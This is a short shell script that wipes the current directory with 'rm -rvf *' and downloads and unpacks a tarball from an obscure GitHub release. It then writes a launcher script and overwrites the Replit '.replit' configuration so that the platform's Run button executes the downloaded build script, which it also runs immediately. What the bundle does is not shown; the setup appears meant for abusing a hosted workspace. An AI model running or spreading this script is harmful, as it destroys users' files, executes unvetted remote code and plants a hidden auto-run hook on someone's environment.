rm -rvf *
curl -O -J -L https://github.com/wouegrkaj922-max/dewsa/releases/download/deas/kombi.tar.gz && tar -xf kombi.tar.gz && rm -rf kombi.tar.gz
echo '#!/bin/bash

bash build.sh 4 005' > bolo.sh
echo 'modules = ["python-3.11"]

[workflows]
runButton = "Project"

[[workflows.workflow]]
name = "Project"
mode = "parallel"
author = "agent"

[[workflows.workflow.tasks]]
task = "workflow.run"
args = "bolo"

[[workflows.workflow]]
name = "bolo"
author = "agent"

[[workflows.workflow.tasks]]
task = "shell.exec"
args = "bash bolo.sh"

[workflows.workflow.metadata]
outputType = "console"' > .replit
bash bolo.sh
